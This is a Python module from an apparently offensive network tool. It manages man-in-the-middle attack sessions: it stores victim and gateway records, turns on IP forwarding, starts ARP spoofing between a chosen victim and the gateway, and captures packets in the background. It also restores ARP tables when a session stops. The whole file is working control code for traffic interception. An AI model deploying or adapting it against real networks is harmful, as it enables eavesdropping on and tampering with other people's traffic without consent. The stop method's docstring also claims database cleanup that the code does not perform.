import logging
from datetime import datetime, timezone
from typing import Optional

from sqlalchemy import text

from janus_data.database import SessionLocal
from janus_data.models import AttackSession, Host
from janus_network.ip_forwarder import enable_ip_forwarding, disable_ip_forwarding
from janus_network.arp_handler import ARPHandler
from janus_network.sniffer import Sniffer

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)


class AttackSessionManager:
    """
    Manages the lifecycle of MITM Attack Sessions:
    - Create session (DB record)
    - Start attack (enable forwarding + ARP spoof thread)
    - Stop attack (stop ARP spoof thread + restore ARP + disable forwarding)
    """

    def __init__(self, interface: str):
        self.interface = interface

        self.db = SessionLocal()
        self.active_session: Optional[AttackSession] = None
        self.arp_handler: Optional[ARPHandler] = None
        self.background_sniffer: Sniffer | None = None

    def create_session(
            self,
            attacker_ip: str,
            attacker_mac: str,
            victim_ip: str,
            gateway_ip: str,
    ) -> Optional[AttackSession]:
        """
        Create a new AttackSession record in the DB.
        Victim and gateway must already exist in the Host table.
        """

        victim_host = (
            self.db.query(Host).filter_by(host_ip_address=victim_ip).first()
        )
        gateway_host = (
            self.db.query(Host).filter_by(host_ip_address=gateway_ip).first()
        )

        if not victim_host or not gateway_host:
            logger.error(
                "[MITM] Cannot create new session — victim or gateway not found in database."
            )
            return None

        session = AttackSession(
            start_time=datetime.now(timezone.utc),
            is_session_active=True,
            victim_host_id=victim_host.id,
            gateway_host_id=gateway_host.id,
            attacker_ip_address=attacker_ip,
            attacker_mac_address=attacker_mac,
        )

        self.db.add(session)
        self.db.commit()
        self.db.refresh(session)

        self.active_session = session

        logger.info(
            f"[MITM] New attack session created — ID={session.id}, "
            f"victim={victim_ip}, gateway={gateway_ip}"
        )
        return session

    def start_session(
            self,
            attacker_ip: str,
            attacker_mac: str,
            victim_ip: str,
            gateway_ip: str,
    ) -> Optional[AttackSession]:
        """
        Full start sequence:
        - create AttackSession
        - enable IP forwarding
        - start ARP spoofing loop in background thread
        """

        session = self.create_session(
            attacker_ip=attacker_ip,
            attacker_mac=attacker_mac,
            victim_ip=victim_ip,
            gateway_ip=gateway_ip,
        )
        if not session:
            return None

        # Ensure we have the latest victim/gateway from DB (with MACs)
        victim = session.victim_host or self.db.query(Host).get(session.victim_host_id)
        gateway = session.gateway_host or self.db.query(Host).get(session.gateway_host_id)

        victim_mac = victim.host_mac_address if victim else None
        gateway_mac = gateway.host_mac_address if gateway else None

        if enable_ip_forwarding():
            logger.info("[MITM] IP forwarding enabled.")
        else:
            logger.error("[MITM] Failed to enable IP forwarding.")
            return None

        # Prepare ARP handler
        self.arp_handler = ARPHandler(interface=self.interface)

        # Use MACs from DB, fall back to _resolve_mac in ARPHandler if needed
        if self.arp_handler.start_spoofing(
                victim_ip=victim_ip,
                gateway_ip=gateway_ip,
                attacker_mac=attacker_mac,
                victim_mac=victim_mac,
                gateway_mac=gateway_mac,
        ):
            logger.info("[MITM] ARP spoofing started successfully.")
        else:
            logger.error(
                "[MITM] Failed to start ARP spoofing. Stopping session and disabling forwarding."
            )
            self.stop_session()
            return None

        logger.info(f"[MITM] Attack session ID={session.id} is ACTIVE.")

        if self.background_sniffer is None:
            self.background_sniffer = Sniffer(interface=self.interface)

        self.background_sniffer.start_background()
        logger.info(
            f"[MITM] Background packet capture started on {self.interface} "
            f"for session ID={session.id}."
        )
        return session

    def stop_session(self) -> bool:
        """
        Stop current MITM session and restore network configuration.
        Also clears packet_data, arp_entry and host tables so each
        new attack starts with a fresh database view.
        """
        if not self.active_session:
            logger.warning("[MITM] No active attack session to stop.")
            return False

        session = self.active_session  # local ref
        victim = session.victim_host
        gateway = session.gateway_host

        # 1) Stop ARP spoofing and restore ARP
        if self.arp_handler and victim and gateway:
            self.arp_handler.stop_spoofing_and_restore(
                victim_ip=victim.host_ip_address,
                gateway_ip=gateway.host_ip_address,
                victim_mac=victim.host_mac_address,
                gateway_mac=gateway.host_mac_address,
            )

        # 2) Disable IP forwarding
        disable_ip_forwarding()

        # 3) Mark session inactive in DB
        session.is_session_active = False
        session.end_time = datetime.now(timezone.utc)
        self.db.commit()

        # 4) Stop background sniffer
        if self.background_sniffer is not None:
            self.background_sniffer.stop_background()
            logger.info("[MITM] Background packet capture stopped.")
            self.background_sniffer = None

        logger.info(
            f"[MITM] Attack Session ID={session.id} stopped and restored."
        )

        # 5) Reset in-memory state
        self.active_session = None
        self.arp_handler = None

        return True

    def list_sessions(self):
        """
        Return all AttackSession records.
        """
        return self.db.query(AttackSession).all()

    def get_active_session(self) -> Optional[AttackSession]:
        """
        Return currently active session (if any).
        """
        return self.active_session
